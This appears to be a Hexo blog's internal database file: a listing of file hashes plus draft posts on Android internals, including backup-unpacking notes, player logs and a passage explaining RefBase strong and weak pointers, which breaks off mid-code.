butterfly/source/css/_highlight/prismjs/diff.styl","hash":"5972c61f5125068cbe0af279a0c93a54847fdc3b","modified":1690873763271},{"_id":"source/_drafts/Dex加固.md","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1703768147614},{"_id":"source/_drafts/Android-Task-Hijacking.md","hash":"e1b5277ef6e126e8f7e7eec71b3084aee3151b27","modified":1725871159072},{"_id":"source/.DS_Store","hash":"da6cc750c84d5600fd080169ca2510fb35b87d0d","modified":1736668110085},{"_id":"source/_drafts/.DS_Store","hash":"df2fbeb1400acda0909a32c1cf6bf492f1121e07","modified":1714500547475},{"_id":"source/_drafts/IDA.md","hash":"f6e625375a3ac73420eb710a3faf8b499e57f706","modified":1711023926038},{"_id":"source/_drafts/android_framework_pointer.md","hash":"db54adc633e50a464d5913b98e51ad3b45cdf66a","modified":1743317789424},{"_id":"source/_drafts/aosp.md","hash":"4d1ccd9e2e7c5486eb0d8fb09f3634c33c05ce63","modified":1746541513386},{"_id":"source/_drafts/android_safe.md","hash":"23e8abe8b2de507690ee21d79ea95767df4b88c4","modified":1756735203624},{"_id":"source/_drafts/android_logd.md","hash":"a898304067823346a9259cc528380f3a9d168b83","modified":1730737960298},{"_id":"source/_drafts/android_framework_lock.md","hash":"09da28498a99f9449f31b3560a773fb62a7fb34d","modified":1743327685132},{"_id":"source/_drafts/cpp.md","hash":"06cd431e2d3085583b83c82d3e77dc99946c7dae","modified":1743320277216},{"_id":"source/_drafts/epoll.md","hash":"32e809cc2ceb90ee79cb13f7d87bec16a3f2dd85","modified":1748174166347},{"_id":"source/_drafts/android_init.md","hash":"bc7006767294a66cb52b514bbbbc93ce3dea86c5","modified":1741771203781},{"_id":"source/_drafts/kernelLinux.md","hash":"d6d80f449fab39121f406d6cc9999680b56e4a93","modified":1750775393257},{"_id":"source/_drafts/elf.md","hash":"c9e6b9a09ee80846def6f98cc3a8975f6581e20d","modified":1728351954250},{"_id":"source/_drafts/makefile.md","hash":"a9df55bb29407c71280384256ad474569e84372d","modified":1737562011947},{"_id":"source/_drafts/plan.md","hash":"4d9c7d8c7b059403f8ec173c2255aee410e5040d","modified":1736669604331},{"_id":"source/_drafts/net.md","hash":"db50cadf7147cd927b2598de7019ea7eb9ffca9c","modified":1751210507253},{"_id":"source/_drafts/system_call.md","hash":"9b54ae93a63c69b78f0c1c6fec8df3b1ad4a6002","modified":1720799554901},{"_id":"source/_drafts/netd.md","hash":"28f9ebb49956c88ce8fa0c6b24638f088134649f","modified":1711975926709},{"_id":"source/_drafts/various.md","hash":"bb9648e23dde9bfba01dbf0e333acdf7b953f849","modified":1721660091000},{"_id":"source/_drafts/s.md","hash":"1a9ecf038aa7c4a050579bd02efbfde743e075e9","modified":1730215608181},{"_id":"source/_drafts/算法.md","hash":"4df7ab78ad689bef1f871e99e6e67dcf910bbb2a","modified":1736788442638},{"_id":"source/_posts/allSafe.md","hash":"374b52dcb9958dd95811d5dd15081f166f6b8d1b","modified":1703768147614},{"_id":"source/_drafts/c.md","hash":"f72afa095b3317624e55cbb4b84a947f77610408","modified":1730713320817},{"_id":"source/_posts/arm.md","hash":"8a9a3589ec8e95e4a5577e588ad7bfb7c715d883","modified":1730394197404},{"_id":"source/_drafts/内核等待队列.md","hash":"51c0df238af7a198a7971c118868a954ffd77379","modified":1749377139058},{"_id":"source/_posts/hello-world.md","hash":"7d98d6592de80fdcd2949bd7401cec12afd98cdf","modified":1703768147615},{"_id":"source/_drafts/vfs.md","hash":"344102203a941fc58d016d87f53d0af50dc08828","modified":1716773980626},{"_id":"source/_posts/fridaHookJava.md","hash":"58c7d2297d81ce12e2999fcfda9e93c8ded4c86a","modified":1721035516485},{"_id":"source/_drafts/POC/.DS_Store","hash":"460ccc19f3a3b14489a46a7c6b90fa3e7ff6930e","modified":1749192522140},{"_id":"source/pic/javasdk.png","hash":"b84cf876ad4fc920019333bb9fdb8d07944b9ffd","modified":1728815152558},{"_id":"source/_posts/binder.md","hash":"6cebc881a8bd813b5f1572eb2337f7184a1970ec","modified":1758449900510},{"_id":"source/pic/vfs_four_object.webp","hash":"1da58043330d4250a884d4e82b612187866ce59f","modified":1714381295650},{"_id":"source/pic/module_source.png","hash":"5c9230a981de608be99c747d64419a7ed403b82a","modified":1728815266070},{"_id":"source/_drafts/POC/readme.md","hash":"ded9a70ebd876c59c0e49ba228af54fec97e519d","modified":1749134931204},{"_id":"source/_drafts/POC/.gitignore","hash":"ef842a737ed626d7b4cc118d0ee8a9e81e5d9d9a","modified":1749134931196},{"_id":"source/_posts/binder/binder_cs.png","hash":"c4fa65259ae3272ca9831aee5b3e4c13bacd6951","modified":1732360745108},{"_id":"source/_drafts/POC/CVE-2019-2215/poc.c","hash":"c5eb636b85189fe4678e448fdeb57cb71debace0","modified":1751134040963},{"_id":"source/_posts/binder/binder_process.png","hash":"7fc4733dfeeb4aac6a2b819eebc7c22fd61a33f6","modified":1732360745109},{"_id":"source/_drafts/POC/CVE-2019-2215/analyze.md","hash":"86b631e67094f75d34ec135f6e8cb7e0fa63f6ca","modified":1751124289588},{"_id":"source/_drafts/POC/.git/HEAD","hash":"acbaef275e46a7f14c1ef456fff2c8bbe8c84724","modified":1749134931208},{"_id":"source/_drafts/POC/.git/ORIG_HEAD","hash":"1c867c2209d2aad29657c380efd8e0a2eb2470bb","modified":1749389736260},{"_id":"source/_drafts/POC/.git/description","hash":"9635f1b7e12c045212819dd934d809ef07efa2f4","modified":1749134724531},{"_id":"source/_drafts/POC/.git/config","hash":"cf69fd9cd9493c404f47bfab64885bade8ad2f38","modified":1749209844324},{"_id":"source/_drafts/POC/.git/index","hash":"2b1472847d35595bc62efcbe401627612921763d","modified":1751210786478},{"_id":"source/_drafts/POC/.git/COMMIT_EDITMSG","hash":"199e5bbcb90db09b03733a13a5a399b8ef4b0615","modified":1749134763913},{"_id":"source/_drafts/POC/.git/FETCH_HEAD","hash":"14b48213eaf963177d63064e4a6b4558f4797136","modified":1749389819145},{"_id":"source/_drafts/POC/.git/info/exclude","hash":"c879df015d97615050afa7b9641e3352a1e701ac","modified":1749134724531},{"_id":"source/_drafts/POC/.git/hooks/applypatch-msg.sample","hash":"4de88eb95a5e93fd27e78b5fb3b5231a8d8917dd","modified":1749134724532},{"_id":"source/_drafts/POC/CVE-2019-2215/test.c","hash":"0bb1278fa8942d0f211ce7e0736de6428dc9791b","modified":1749389819174},{"_id":"source/_drafts/POC/.git/hooks/commit-msg.sample","hash":"ee1ed5aad98a435f2020b6de35c173b75d9affac","modified":1749134724531},{"_id":"source/_drafts/POC/.git/hooks/pre-applypatch.sample","hash":"f208287c1a92525de9f5462e905a9d31de1e2d75","modified":1749134724533},{"_id":"source/_drafts/POC/.git/hooks/fsmonitor-watchman.sample","hash":"0ec0ec9ac11111433d17ea79e0ae8cec650dcfa4","modified":1749134724532},{"_id":"source/_drafts/POC/.git/hooks/post-update.sample","hash":"b614c2f63da7dca9f1db2e7ade61ef30448fc96c","modified":1749134724533},{"_id":"source/_drafts/POC/.git/hooks/pre-commit.sample","hash":"8093d68e142db52dcab2215e770ba0bbe4cfbf24","modified":1749134724532},{"_id":"source/_drafts/POC/.git/hooks/pre-merge-commit.sample","hash":"04c64e58bc25c149482ed45dbd79e40effb89eb7","modified":1749134724533},{"_id":"source/_drafts/POC/.git/hooks/pre-push.sample","hash":"a599b773b930ca83dbc3a5c7c13059ac4a6eaedc","modified":1749134724533},{"_id":"source/_drafts/POC/.git/hooks/pre-rebase.sample","hash":"288efdc0027db4cfd8b7c47c4aeddba09b6ded12","modified":1749134724532},{"_id":"source/_drafts/POC/.git/hooks/pre-receive.sample","hash":"705a17d259e7896f0082fe2e9f2c0c3b127be5ac","modified":1749134724533},{"_id":"source/_drafts/POC/.git/logs/HEAD","hash":"861d425e7ccaabb5e912367293954be7187bdebb","modified":1749389819174},{"_id":"source/_drafts/POC/.git/hooks/push-to-checkout.sample","hash":"508240328c8b55f8157c93c43bf5e291e5d2fbcb","modified":1749134724534},{"_id":"source/_drafts/POC/.git/hooks/sendemail-validate.sample","hash":"74cf1d5415a5c03c110240f749491297d65c4c98","modified":1749134724532},{"_id":"source/_drafts/POC/.git/hooks/prepare-commit-msg.sample","hash":"2584806ba147152ae005cb675aa4f01d5d068456","modified":1749134724533},{"_id":"source/_drafts/POC/.git/hooks/update.sample","hash":"730e6bd5225478bab6147b7a62a6e2ae21d40507","modified":1749134724533},{"_id":"source/_drafts/POC/.git/objects/1b/9139d90a687a00a1a5f5aca1212ae126f49402","hash":"fe5145a5204ed007a4c4a104c542ef6d4466e50e","modified":1749134739871},{"_id":"source/_drafts/POC/.git/objects/3e/b389e14556f96c3e6b977b720626844ed80a47","hash":"e1c1a3e21b106ae40f01288f862cf0a4f88de3c0","modified":1749389818218},{"_id":"source/_drafts/POC/.git/objects/1a/403032ad0d089748cf71ab88c11190f82602a5","hash":"54a0274070c191111bbe9c6ac3153f1bb7cf1cd3","modified":1749389819134},{"_id":"source/_drafts/POC/.git/objects/51/731701a9eec358394376022090c7980b3fa098","hash":"3df45fd0f9c321668b3b20024644f736a12741d1","modified":1749134931206},{"_id":"source/_drafts/POC/.git/objects/53/64e3648bdd908a717028da7574615bea798a27","hash":"65824a9c381f55e6c29f0ce4e9f8e307b85ef6a0","modified":1749134931202},{"_id":"source/_drafts/POC/.git/objects/a0/e32242ecd7683d80b0970160b384ff401c76f9","hash":"46ac48898036480ab87c32922fd8b169a8fba784","modified":1749389818219},{"_id":"source/_drafts/POC/.git/objects/a8/79fa82fe75d28f6a19f85252aba743a53fff0d","hash":"3b826327acfb9d779101fadba337f4b63d43a5a1","modified":1749389818219},{"_id":"source/_drafts/POC/.git/objects/78/e9178689f6e46543b9ddd7c5028f99ce31327d","hash":"572237f93bd4a88b126a0e022d2ec7dcc926f811","modified":1749134763912},{"_id":"source/_drafts/POC/.git/objects/1f/99f9d2f5991ce306c889762846d78e4ff53176","hash":"23bfcf83a043fbe7d60bf6c13422cc39191b1b85","modified":1749134831239},{"_id":"source/_drafts/POC/.git/objects/cc/43c4be0b7ac60cb677c7ac3fe8e7d88462ec12","hash":"07f080da48f2cdf1d0f719735e94044ab4c86176","modified":1749134763912},{"_id":"source/_drafts/POC/.git/objects/e0/0b433a0ea025b513cf93f9dee6a7c4e93e1e89","hash":"9d45dce1326c5eef5751667601861049693789af","modified":1749134763913},{"_id":"source/_drafts/POC/.git/objects/b7/a6e84d6c940350f593b4528a4d708ac9415b70","hash":"ed7442db2eda36939d16e36d629f2b48bbe9106f","modified":1749134739870},{"_id":"source/_drafts/POC/.git/objects/38/2aef4711040a4ffe473893f02a5126fcaaafa4","hash":"243b71caa4beeb34f34352823a1c953c9aaf6131","modified":1749134831239},{"_id":"source/_drafts/POC/.git/objects/28/ab9e6c8438828488cc9c131f13478c10255edd","hash":"fbd9b485650f532038bcd63f2a23663c8c82c79f","modified":1749134831238},{"_id":"source/_drafts/POC/.git/refs/heads/master","hash":"4ebe381bd4c0dd0acb21850cee0c45898ca41931","modified":1749389819174},{"_id":"source/_drafts/POC/.git/logs/refs/heads/master","hash":"ac0a55c0b3921daf2dc3d576581cb18a36243ca0","modified":1749389819174},{"_id":"source/_drafts/POC/.git/logs/refs/remotes/origin/main","hash":"d09ee979ed84c8f3d7be9f3ec793ecd5ce9f0be9","modified":1749389819145},{"_id":"source/_drafts/POC/.git/refs/remotes/origin/HEAD","hash":"5ae7c22895c35af5f56ba1891a4dd62b4dc1f955","modified":1749134831539},{"_id":"source/_drafts/POC/.git/logs/refs/remotes/origin/HEAD","hash":"0618178d302b9d00fa50612f6b83351e7eb4c282","modified":1749134831539},{"_id":"source/_drafts/POC/.git/refs/remotes/origin/main","hash":"4ebe381bd4c0dd0acb21850cee0c45898ca41931","modified":1749389819144},{"_id":"source/pic/linux_vfs.png","hash":"30a69a698421a095e1bff5d4510c9ffd5f1d7f7a","modified":1714380096316},{"_id":"source/Screenshot from 2024-06-23 08-25-55.png","hash":"5ce3cb5b3e7924502dbdb5845c4396c18df5edf3","modified":1720799554901},{"_id":"source/pic/code_sht.JPG","hash":"3ac9234b83c9c0393ba2bcadaee11ed20d8c1ece","modified":1728292472300},{"_id":"source/_posts/binder/binder_principle.png","hash":"97689b9d7a5de7378487bae1c7e558d576b19bd2","modified":1732360745109},{"_id":"source/pic/elf_header.png","hash":"8a0ceb0bc72e509ab94e714cc465c12045694937","modified":1728290266256},{"_id":"source/pic/pht.png","hash":"97b950aa916ba3190005e17a957b13a482735de9","modified":1728300059882},{"_id":"source/pic/sht.png","hash":"399c50c5a4911513eb4735bc41cb15e1b6916a2b","modified":1728292181441},{"_id":"source/_drafts/POC/.git/objects/3a/e1754eafe63fab5fb5b4610d49fffad57a3d35","hash":"75df708d634194eecb0bc31ad71433170b151396","modified":1749389819133},{"_id":"source/_drafts/POC/.git/objects/0c/abb0c3f7988807aa6dc6a16de4f406783b2792","hash":"e83983e011445c15e5ce0ce1a6af06b3f1d8a873","modified":1749389819089},{"_id":"source/_drafts/POC/CVE-2019-2215/poc","hash":"73456fa7aaa2ee6f40c14119a08acd91895aad99","modified":1749389819167},{"_id":"source/_drafts/POC/CVE-2019-2215/test","hash":"9e2ec8c5970ed5e0c9db50ad46cd3285195d757b","modified":1749389819174},{"_id":"public/2025/03/29/binder/index.html","hash":"3e6a32820e40be5ba46aade29dffdf75682b5f26","modified":1752559646070},{"_id":"public/2023/12/28/hello-world/index.html","hash":"97dfcfd4d0659b623ce4b18459dbe41ce9cff7cd","modified":1752559646070},{"_id":"public/2023/12/28/arm/index.html","hash":"a0af86684b52524f48b5b044520636c1f1de11c7","modified":1752559646070},{"_id":"public/2023/05/05/fridaHookJava/index.html","hash":"5f42fbc9b1bbd3d68e489f6782d77dfa1afb039f","modified":1752559646070},{"_id":"public/2023/01/25/allSafe/index.html","hash":"722fe8c90a36360d4bcd45b11c93983413b1a74f","modified":1752559646070},{"_id":"public/archives/index.html","hash":"246231b1301f0c24c8ac8510ec8c84adf0fad804","modified":1758442403963},{"_id":"public/archives/2023/index.html","hash":"d8e1c51e3fe60c0ec48ed7dfe7b6f49ac7404d27","modified":1758442403963},{"_id":"public/archives/2023/01/index.html","hash":"c1f541cfde0e0820eede823bcffaac2793642a07","modified":1758442403963},{"_id":"public/archives/2023/05/index.html","hash":"005c17b48c54b5264f68d863532e9c3a4b07ab2a","modified":1758442403963},{"_id":"public/archives/2023/12/index.html","hash":"5c541ad46d9dce4d81c48123ee67c96d80d42614","modified":1758442403963},{"_id":"public/archives/2025/index.html","hash":"a2dbbc4264216af142dca0326d4f48897fd0bea2","modified":1758442403963},{"_id":"public/archives/2025/03/index.html","hash":"27c210fc5034f6b25ae5af6dc48197b6f5d76766","modified":1758442403963},{"_id":"public/categories/Frida/index.html","hash":"d29df3ad9207b210f310470440212891cdb3f302","modified":1758442403963},{"_id":"public/index.html","hash":"0a7cd7e2a7c4de0f7b97fa361d95a362ea2c80c0","modified":1758442403963},{"_id":"public/img/404.jpg","hash":"fb4489bc1d30c93d28f7332158c1c6c1416148de","modified":1752559646070},{"_id":"public/img/friend_404.gif","hash":"8d2d0ebef70a8eb07329f57e645889b0e420fa48","modified":1752559646070},{"_id":"public/img/favicon.png","hash":"3cf89864b4f6c9b532522a4d260a2e887971c92d","modified":1752559646070},{"_id":"public/pic/javasdk.png","hash":"b84cf876ad4fc920019333bb9fdb8d07944b9ffd","modified":1752559646070},{"_id":"public/pic/module_source.png","hash":"5c9230a981de608be99c747d64419a7ed403b82a","modified":1752559646070},{"_id":"public/pic/vfs_four_object.webp","hash":"1da58043330d4250a884d4e82b612187866ce59f","modified":1752559646070},{"_id":"public/2025/03/29/binder/binder_cs.png","hash":"c4fa65259ae3272ca9831aee5b3e4c13bacd6951","modified":1752559646070},{"_id":"public/2025/03/29/binder/binder_process.png","hash":"7fc4733dfeeb4aac6a2b819eebc7c22fd61a33f6","modified":1752559646070},{"_id":"public/js/main.js","hash":"0227b5bd233a3c66582e0ee820cdb353ce52ece1","modified":1752559646070},{"_id":"public/js/tw_cn.js","hash":"42b106354d72a0ea1fe62587b313a5b7de3cc393","modified":1752559646070},{"_id":"public/js/utils.js","hash":"aaaedc207440095da1ffabcad870fc2641befb0e","modified":1752559646070},{"_id":"public/css/index.css","hash":"2144e07cfda26094423f63931dfc9bf9a5d1c0ce","modified":1752559646070},{"_id":"public/css/var.css","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1752559646070},{"_id":"public/js/search/local-search.js","hash":"8509cbd954ee9e099dcfbbfdafba70893a56e9ae","modified":1752559646070},{"_id":"public/js/search/algolia.js","hash":"fd86281d4f0f99ce173e49c1a0df3507fe268d37","modified":1752559646070},{"_id":"public/pic/linux_vfs.png","hash":"30a69a698421a095e1bff5d4510c9ffd5f1d7f7a","modified":1752559646070},{"_id":"public/Screenshot from 2024-06-23 08-25-55.png","hash":"5ce3cb5b3e7924502dbdb5845c4396c18df5edf3","modified":1752559646070},{"_id":"public/pic/code_sht.JPG","hash":"3ac9234b83c9c0393ba2bcadaee11ed20d8c1ece","modified":1752559646070},{"_id":"public/2025/03/29/binder/binder_principle.png","hash":"97689b9d7a5de7378487bae1c7e558d576b19bd2","modified":1752559646070},{"_id":"public/pic/elf_header.png","hash":"8a0ceb0bc72e509ab94e714cc465c12045694937","modified":1752559646070},{"_id":"public/pic/sht.png","hash":"399c50c5a4911513eb4735bc41cb15e1b6916a2b","modified":1752559646070},{"_id":"public/pic/pht.png","hash":"97b950aa916ba3190005e17a957b13a482735de9","modified":1752559646070},{"_id":"source/_drafts/日志关键词.md","hash":"0a6d352729bf60736e525823bdec3f8109e423ad","modified":1753079205640},{"_id":"source/_drafts/a","hash":"86a0f3e8f0ff5fd26dbf0a46fda87d4c49475b7d","modified":1754017430461},{"_id":"source/_drafts/android_framework_AMS.md","hash":"f77fdaefb0f53dc99997b9669c280354eb4e2ffd","modified":1753701671343},{"_id":"source/_drafts/JNIGuide/.git/description","hash":"9635f1b7e12c045212819dd934d809ef07efa2f4","modified":1757608739195},{"_id":"source/_drafts/JNIGuide/.git/index","hash":"75b8667b4c1fbe8adc777e46fde2a13983f3a748","modified":1757608740917},{"_id":"source/_drafts/JNIGuide/.git/config","hash":"09bf09d3c341394b4d4d6da6c7304079a106bfa1","modified":1758118562304},{"_id":"source/_drafts/JNIGuide/README.md","hash":"87130f34fe67aa15ceac423ef2adb35429bd37a5","modified":1757608740916},{"_id":"source/_drafts/JNIGuide/.git/HEAD","hash":"9f1df7eea4156be8a871c292b549b3325e425aa2","modified":1757608740913},{"_id":"source/_drafts/JNIGuide/images/designa.gif","hash":"e32e986692b9ffa914ac0e08e7d9f3d0d0a06a5d","modified":1757608740917},{"_id":"source/_drafts/JNIGuide/.git/packed-refs","hash":"8e320c92d0013353e9519f03609f556659c1c3a7","modified":1757608740912},{"_id":"source/_drafts/JNIGuide/images/types4.gif","hash":"352da8e72b383a2ef29abcc1be7c6663befd5fe9","modified":1757608740917},{"_id":"source/_drafts/JNIGuide/.git/logs/HEAD","hash":"6c83cf9d687a4c6da3fe7d30bc906fddab9191f8","modified":1757608740914},{"_id":"source/_drafts/JNIGuide/.git/info/exclude","hash":"c879df015d97615050afa7b9641e3352a1e701ac","modified":1757608739195},{"_id":"source/_drafts/JNIGuide/.git/hooks/pre-applypatch.sample","hash":"f208287c1a92525de9f5462e905a9d31de1e2d75","modified":1757608739198},{"_id":"source/_drafts/JNIGuide/.git/hooks/applypatch-msg.sample","hash":"4de88eb95a5e93fd27e78b5fb3b5231a8d8917dd","modified":1757608739197},{"_id":"source/_drafts/JNIGuide/.git/hooks/commit-msg.sample","hash":"ee1ed5aad98a435f2020b6de35c173b75d9affac","modified":1757608739196},{"_id":"source/_drafts/JNIGuide/.git/hooks/fsmonitor-watchman.sample","hash":"0ec0ec9ac11111433d17ea79e0ae8cec650dcfa4","modified":1757608739197},{"_id":"source/_drafts/JNIGuide/.git/hooks/post-update.sample","hash":"b614c2f63da7dca9f1db2e7ade61ef30448fc96c","modified":1757608739197},{"_id":"source/_drafts/JNIGuide/.git/hooks/pre-commit.sample","hash":"8093d68e142db52dcab2215e770ba0bbe4cfbf24","modified":1757608739196},{"_id":"source/_drafts/JNIGuide/.git/hooks/pre-receive.sample","hash":"705a17d259e7896f0082fe2e9f2c0c3b127be5ac","modified":1757608739197},{"_id":"source/_drafts/JNIGuide/.git/hooks/pre-merge-commit.sample","hash":"04c64e58bc25c149482ed45dbd79e40effb89eb7","modified":1757608739198},{"_id":"source/_drafts/JNIGuide/.git/hooks/prepare-commit-msg.sample","hash":"2584806ba147152ae005cb675aa4f01d5d068456","modified":1757608739197},{"_id":"source/_drafts/JNIGuide/.git/hooks/sendemail-validate.sample","hash":"74cf1d5415a5c03c110240f749491297d65c4c98","modified":1757608739196},{"_id":"source/_drafts/JNIGuide/.git/hooks/pre-rebase.sample","hash":"288efdc0027db4cfd8b7c47c4aeddba09b6ded12","modified":1757608739196},{"_id":"source/_drafts/JNIGuide/.git/hooks/pre-push.sample","hash":"a599b773b930ca83dbc3a5c7c13059ac4a6eaedc","modified":1757608739199},{"_id":"source/_drafts/JNIGuide/.git/objects/pack/pack-31da16518a5d56d8ccde7bb66c8bd541176a359e.idx","hash":"056f977399e0944672b41cf078f24136410176fb","modified":1757608740902},{"_id":"source/_drafts/JNIGuide/.git/hooks/push-to-checkout.sample","hash":"508240328c8b55f8157c93c43bf5e291e5d2fbcb","modified":1757608739199},{"_id":"source/_drafts/JNIGuide/.git/hooks/update.sample","hash":"730e6bd5225478bab6147b7a62a6e2ae21d40507","modified":1757608739199},{"_id":"source/_drafts/JNIGuide/.git/objects/pack/pack-31da16518a5d56d8ccde7bb66c8bd541176a359e.rev","hash":"3dc7c241fb61c5d1bad134f8b387503856ef9382","modified":1757608740902},{"_id":"source/_drafts/JNIGuide/.git/refs/heads/main","hash":"f801174c3ef9c018d0599616d91672e604936f39","modified":1757608740914},{"_id":"source/_drafts/JNIGuide/.git/logs/refs/heads/main","hash":"6c83cf9d687a4c6da3fe7d30bc906fddab9191f8","modified":1757608740914},{"_id":"source/_drafts/JNIGuide/.git/refs/remotes/origin/HEAD","hash":"5ae7c22895c35af5f56ba1891a4dd62b4dc1f955","modified":1757608740912},{"_id":"source/_drafts/JNIGuide/.git/logs/refs/remotes/origin/HEAD","hash":"6c83cf9d687a4c6da3fe7d30bc906fddab9191f8","modified":1757608740913},{"_id":"source/_drafts/JNIGuide/.git/objects/pack/pack-31da16518a5d56d8ccde7bb66c8bd541176a359e.pack","hash":"6e09ac2f5f710b93b4b70592fc26b7d455061da4","modified":1757608740901},{"_id":"source/_drafts/ebpf.md","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1758449594096},{"_id":"source/_drafts/so.md","hash":"fb7c8ed1bb5dc76144dfb13c96c86cc304473234","modified":1758466098723}],"Category":[{"name":"Frida","_id":"cmd44rit2000rv8fy9denahj5"}],"Data":[],"Page":[],"Post":[{"title":"Android Task Hijacking","author":"nuoen","_content":"解压android备份\njava -jar  abe.jar unpack  back.ab back.tar\nopenssl zlib -d -in back.tar -out decompressed.tar\n\n09-02 15:38:30.573 D/CorePlayer(15550): Use user's preferred resolution : 7\n09-02 15:38:30.573 I/CorePlayer(15550): decreaseDefinition: resolution = 3\n09-02 15:38:30.573 I/IqiyiSdkVideoView(15550): setResolution: 0 -> 3\n09-02 15:38:30.574 I/IqiyiSdkVideoView(15550): toQiyiBitStream, resolution : 3, bitstream: null\n09-02 15:38:30.574 I/IqiyiSdkVideoView(15550): setResolution: quality is null, errorCode: 2100\n\n09-02 15:38:30.622 I/IqiyiSdkVideoView(15550): createAndPrepareMediaPlayer, playDolby: false, mVipMember: true, mPaid: true, audioType: 0, Bitstream definition: 5, dynamicRangeType: 1","source":"_drafts/Android-Task-Hijacking.md","raw":"---\ntitle: Android Task Hijacking\nauthor: nuoen\ntags:\n---\n解压android备份\njava -jar  abe.jar unpack  back.ab back.tar\nopenssl zlib -d -in back.tar -out decompressed.tar\n\n09-02 15:38:30.573 D/CorePlayer(15550): Use user's preferred resolution : 7\n09-02 15:38:30.573 I/CorePlayer(15550): decreaseDefinition: resolution = 3\n09-02 15:38:30.573 I/IqiyiSdkVideoView(15550): setResolution: 0 -> 3\n09-02 15:38:30.574 I/IqiyiSdkVideoView(15550): toQiyiBitStream, resolution : 3, bitstream: null\n09-02 15:38:30.574 I/IqiyiSdkVideoView(15550): setResolution: quality is null, errorCode: 2100\n\n09-02 15:38:30.622 I/IqiyiSdkVideoView(15550): createAndPrepareMediaPlayer, playDolby: false, mVipMember: true, mPaid: true, audioType: 0, Bitstream definition: 5, dynamicRangeType: 1","slug":"Android-Task-Hijacking","published":0,"date":"2023-12-28T12:55:47.614Z","updated":"2024-09-09T08:39:19.072Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44risu0000v8fycj9t4x4j","content":"<p>解压android备份<br>java -jar  abe.jar unpack  back.ab back.tar<br>openssl zlib -d -in back.tar -out decompressed.tar</p>\n<p>09-02 15:38:30.573 D/CorePlayer(15550): Use user’s preferred resolution : 7<br>09-02 15:38:30.573 I/CorePlayer(15550): decreaseDefinition: resolution = 3<br>09-02 15:38:30.573 I/IqiyiSdkVideoView(15550): setResolution: 0 -&gt; 3<br>09-02 15:38:30.574 I/IqiyiSdkVideoView(15550): toQiyiBitStream, resolution : 3, bitstream: null<br>09-02 15:38:30.574 I/IqiyiSdkVideoView(15550): setResolution: quality is null, errorCode: 2100</p>\n<p>09-02 15:38:30.622 I/IqiyiSdkVideoView(15550): createAndPrepareMediaPlayer, playDolby: false, mVipMember: true, mPaid: true, audioType: 0, Bitstream definition: 5, dynamicRangeType: 1</p>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<p>解压android备份<br>java -jar  abe.jar unpack  back.ab back.tar<br>openssl zlib -d -in back.tar -out decompressed.tar</p>\n<p>09-02 15:38:30.573 D/CorePlayer(15550): Use user’s preferred resolution : 7<br>09-02 15:38:30.573 I/CorePlayer(15550): decreaseDefinition: resolution = 3<br>09-02 15:38:30.573 I/IqiyiSdkVideoView(15550): setResolution: 0 -&gt; 3<br>09-02 15:38:30.574 I/IqiyiSdkVideoView(15550): toQiyiBitStream, resolution : 3, bitstream: null<br>09-02 15:38:30.574 I/IqiyiSdkVideoView(15550): setResolution: quality is null, errorCode: 2100</p>\n<p>09-02 15:38:30.622 I/IqiyiSdkVideoView(15550): createAndPrepareMediaPlayer, playDolby: false, mVipMember: true, mPaid: true, audioType: 0, Bitstream definition: 5, dynamicRangeType: 1</p>\n"},{"_content":"","source":"_drafts/Dex加固.md","raw":"","slug":"Dex加固","published":0,"date":"2023-12-28T12:55:47.614Z","updated":"2023-12-28T12:55:47.614Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44risw0001v8fybzfx9piq","content":"","site":{"data":{}},"cover":false,"excerpt":"","more":""},{"_content":"title: android强弱引用指针\nauthor: nuoen\ntags: []\ncategories:\n  - cpp \n  - android\n  - framework\ndate: 2025-03-29 21:39:00\n\n# android强弱引用指针\n```\n                    ┌───────────────────────────────┐\n                    │ new MyObject();               │\n                    │ → RefBase::init()             │\n                    │ → mStrong = 0, mWeak = 0      │\n                    └──────────────┬────────────────┘\n                                   │\n                     ┌────────────▼────────────┐\n                     │ sp<MyObject> strongRef  │  ← 构造时调用 incStrong()\n                     └────────────┬────────────┘\n                                   │\n                     +1           ▼           +1\n              mStrong = 1     MyObject()     mWeak = 1  ← RefBase 中自动创建弱引用计数\n                                   │\n                                   ▼\n                          ┌──────────────┐\n                          │ wp<MyObject> │  ← 构造时调用 incWeak()\n                          └──────┬───────┘\n                                 │\n                     +1         ▼         +0\n              mStrong = 1   still alive   mWeak = 2\n\n   ┌────────────┐\n   │ clear sp<> │ → decStrong()，mStrong -1 = 0\n   └────┬───────┘\n        │\n        ▼\n  ┌──────────────┐\n  │ 析构 MyObject │  ← 对象析构（~MyObject）\n  └────┬─────────┘\n       │\n       ▼\n  ┌──────────────┐\n  │ promote()    │ ← wp.promote()\n  └────┬─────────┘\n       │\n       ▼\n  mStrong == 0 → 返回 nullptr\n  对象已被销毁，无法再访问\n\n最终：\n  mStrong = 0\n  mWeak = 1（直到 wp 也析构）\n\n```\n## RefBase\n```cpp\nclass RefBase\n{\npublic:\n            void            incStrong(const void* id) const;\n            void            decStrong(const void* id) const;\n            void            forceIncStrong(const void* id) const;\n            //! DEBUGGING ONLY: Get current strong ref count.\n            int32_t         getStrongCount() const;\n\n    class weakref_type\n    {\n    public:\n        RefBase*            refBase() const;\n\n        void                incWeak(const void* id);\n        void                decWeak(const void* id);\n\n        // acquires a strong reference if there is already one.\n        bool                attemptIncStrong(const void* id);\n\n        // acquires a weak reference if there is already one.\n        // This is not always safe. see ProcessState.cpp and BpBinder.cpp\n        // for proper use.\n        bool                attemptIncWeak(const void* id);\n\n        //! DEBUGGING ONLY: Get current weak ref count.\n        int32_t             getWeakCount() const;\n\n        //! DEBUGGING ONLY: Print references held on object.\n        void                printRefs() const;\n\n        //! DEBUGGING ONLY: Enable tracking for this object.\n        // enable -- enable/disable tracking\n        // retain -- when tracking is enable, if true, then we save a stack trace\n        //           for each reference and dereference; when retain == false, we\n        //           match up references and dereferences and keep only the\n        //           outstanding ones.\n\n        void                trackMe(bool enable, bool retain);\n    };\n\n            weakref_type*   createWeak(const void* id) const;\n            \n            weakref_type*   getWeakRefs() const;\n\n            //! DEBUGGING ONLY: Print references held on object.\n    inline  void            printRefs() const { getWeakRefs()->printRefs(); }\n\n            //! DEBUGGING ONLY: Enable tracking of object.\n    inline  void            trackMe(bool enable, bool retain)\n    { \n        getWeakRefs()->trackMe(enable, retain); \n    